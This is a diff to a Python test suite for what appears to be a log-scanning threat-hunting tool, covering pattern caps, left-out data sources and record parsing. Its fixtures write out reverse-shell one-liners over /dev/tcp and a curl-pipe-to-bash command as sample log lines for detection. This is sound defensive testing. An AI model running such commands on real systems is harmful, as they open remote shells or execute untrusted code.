@@ -99,6 +99,7 @@ REFUSALS = [
     ({"match": {"anchored": "abcd\\S*e\\S*f\\S*g\\S*h\\S*i"}}, "more than 4 repeats"),
     ({"match": {"anchored": "abcd.*x"}}, "open gaps"),
     ({"match": {"anchored": "abcd[^ ]{0,200}x.{0,200}"}}, "sum to 400"),
+    ({"match": {"anchored": "abcd.{0,80}=.{0,80}=.{0,80}=.{0,80}X"}}, "open gaps"),
     ({"match": {"anchored": "abcd\\S*\\S*\\S*x"}}, "two repeats"),
     ({"match": {"anchored": "abcd[e-w]*[e-w]*[e-w]*[e-w]*X"}}, "two repeats"),
     ({"telemetry": ["any", "linux_text"]}, "stands alone"),
@@ -298,7 +299,8 @@ def _hit(n: int, message: str, *, host: str | None = "web1", ts: datetime | None
 
 
 CONTRACT = contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword", "host.name": "keyword",
-                                         "message": "text"})
+                                         "message": "text",
+                                         "event.module": "keyword", "input.type": "keyword"})
 
 
 def _Contract():
@@ -624,7 +626,8 @@ def swept(tmp_path, monkeypatch):
     client = ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES),
                            transport=httpx.MockTransport(TextES(SWEEP_HITS)))
     contracts = {TARGET: contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword",
-                                                      "host.name": "keyword", "message": "text"})}
+                                                      "host.name": "keyword", "message": "text",
+                                         "event.module": "keyword", "input.type": "keyword"})}
     sweep = Sweep(repo, client, "h1", WINDOW, contracts, stage_dir=tmp_path / "stage")
     sweep.run_target(TARGET)
     sweep.finalize()
@@ -748,7 +751,8 @@ def test_a_sweep_run_again_replaces_the_pool(swept, tmp_path, monkeypatch):
     client = ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES),
                            transport=httpx.MockTransport(TextES(SWEEP_HITS[:1])))
     contracts = {TARGET: contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword",
-                                                      "host.name": "keyword", "message": "text"})}
+                                                      "host.name": "keyword", "message": "text",
+                                         "event.module": "keyword", "input.type": "keyword"})}
     again = Sweep(repo, client, "h1", WINDOW, contracts, stage_dir=tmp_path / "stage2")
     again.run_target(TARGET)
     again.finalize()
@@ -1230,3 +1234,90 @@ def test_the_same_hunt_with_and_without_patterns_differs_only_in_its_mentions(tm
     assert sorted(a) == sorted(b)
     for key in sorted(a):
         assert a[key] == b[key], key
+
+
+# ---- re-review: every left-out source, the cap order, pair-bound losses, records that are documents ---------------
+
+LEFT_OUT_CASES = {
+    "reconciliation shortfall": ({"dataset_reconciliation": {"logs-linux": [
+        {"dataset": "custom.app", "records": 120, "count_scope": "records in the hunt window by @timestamp",
+         "reason": "not retrieved by the sweep: no normalizer reads this dataset, so no rule evaluates it"},
+        {"dataset": "web.empty", "records": 0, "count_scope": "records in the hunt window by @timestamp",
+         "reason": "selected for retrieval, but none of its records falls in the hunt window"}]}}, {},
+        {("logs-linux", "dataset", "custom.app")}),
+    "reconciliation not performed": ({"dataset_reconciliation": {"logs-linux": [
+        {"dataset": "any dataset not read in full", "records": None, "count_scope": "not counted: no counts",
+         "reason": "dataset reconciliation not performed on logs-linux: no counts"}]}}, {},
+        {("logs-linux", "dataset", "any dataset not read in full")}),
+    "linux shapes": ({"linux_shapes_not_assessed": {"logs-linux": [
+        "input.type:journald: not searchable on this target (the field this shape is selected by is not mapped)"]}},
+        {}, {("logs-linux", "shape", "input.type:journald")}),
+    "windows shapes": ({"windows_shapes_not_assessed": {"logs-win": [
+        "windows.nxlog: not searchable on this target (Channel and EventID are not both mapped)"]}}, {},
+        {("logs-win", "shape", "windows.nxlog")}),
+    "windows inventory unavailable": ({}, {"logs-win": [
+        "event class inventory unavailable: channel/provider/event id fields are not searchable"]},
+        {("logs-win", "channel", "any channel outside the catalog's")}),
+}
+
+
+@pytest.mark.parametrize("case", sorted(LEFT_OUT_CASES))
+def test_every_source_the_fetch_leaves_out_is_named_and_makes_the_pool_partial(tmp_path, case):
+    from types import SimpleNamespace
+    stats, inventory_reasons, expected = LEFT_OUT_CASES[case]
+    owner = SimpleNamespace(stats=stats, _windows_selective=set(), _windows_inventory_reasons=inventory_reasons)
+    scanner = _scanner(tmp_path)
+    Sweep._mention_left_out(owner, scanner)
+    assert {(item["target"], item["kind"], item["name"]) for item in scanner.left_out} == expected
+    summary = scanner.summary()
+    assert summary["status"] == "partial" and summary["left_out_sources"]
+    scanner.close()
+
+
+def test_no_group_is_dropped_for_a_line_another_cap_refuses(tmp_path):
+    scanner = _scanner(tmp_path, max_per_pattern=2, max_per_host=2)
+    busy = [_hit(n, f"bash -i >& /dev/tcp/10.0.0.{n}/1 0>&1", host="hostA") for n in range(2)]
+    full = [_hit(10 + n, f"curl http://x/{n} | bash", host="hostB") for n in range(2)]
+    late = _hit(99, "bash -i >& /dev/tcp/10.9.9.9/2 0>&1", host="hostB")
+    scanner.scan(TARGET, CONTRACT, [(hit, "x") for hit in [*busy, *full, late]], None)
+    kept = [(scanner.patterns.patterns[row[1]].id, row[2]) for row in scanner.ranked()]
+    # hostB is at its cap with strong groups: the late line is not kept, and hostA keeps both its groups
+    assert sorted(kept).count(("mention.test_dev_tcp_redirect", "hostA")) == 2 and len(kept) == 4
+    summary = scanner.summary()
+    assert summary["lines_not_kept"] == 1 and summary["groups_evicted"] == 0
+    scanner.close()
+
+
+def test_losses_past_the_pair_bound_are_one_row_per_pattern(tmp_path, monkeypatch):
+    import romulus.hunt.mentions as scanner_module
+    monkeypatch.setattr(scanner_module, "MAX_SEEN_PAIRS", 2)
+    repo = _repo()
+    scanner = _scanner(tmp_path, max_per_pattern=1)
+    hits = [_hit(n, f"MIMIKATZ run {n}", host=f"h{n}") for n in range(5)]
+    scanner.scan(TARGET, CONTRACT, [(hit, "x") for hit in hits], None)
+    summary = scanner.publish(repo)
+    rows = repo.mention_losses("h1")
+    bound = [row for row in rows if row["host"] == scanner_module.PAST_PAIR_BOUND]
+    assert len(bound) == 1 and bound[0]["pattern_id"] == "mention.test_mimikatz"
+    assert sum(row["lines_not_kept"] for row in rows) == summary["lines_not_kept"] == 4
+    scanner.close()
+
+
+@pytest.mark.parametrize(("original", "reason"), [
+    ('[{"cmd": "bash -i >& /dev/tcp/10.0.0.1/1 0>&1"}]', "event.original is a JSON array"),
+    ("<Event><Data>bash -i &gt;&amp; /dev/tcp/10.0.0.1/1 0&gt;&amp;1</Data></Event>", "event.original is an XML record"),
+])
+def test_an_event_original_that_is_a_document_is_never_scanned_as_a_line(tmp_path, original, reason):
+    record = {"_index": TARGET, "_id": "d1", "_source": {"@timestamp": T0.isoformat(), "host": {"name": "web1"},
+                                                         "event": {"original": original}}}
+    scanner = _scanner(tmp_path)
+    scanner.scan(TARGET, CONTRACT, [(record, "x")], None)
+    summary = scanner.summary()
+    assert summary["not_scanned"]["records"] == {reason: 1} and summary["lines_scanned"] == 0
+    assert summary["status"] == "partial"
+    # text that only starts with "<" is a line like any other
+    plain = {"_index": TARGET, "_id": "d2", "_source": {"@timestamp": T0.isoformat(), "host": {"name": "web1"},
+                                                        "event": {"original": "<13>sh: bash -i >& /dev/tcp/1.2.3.4/1"}}}
+    scanner.scan(TARGET, CONTRACT, [(plain, "x")], None)
+    assert scanner.summary()["lines_matched"] == 1
+    scanner.close()
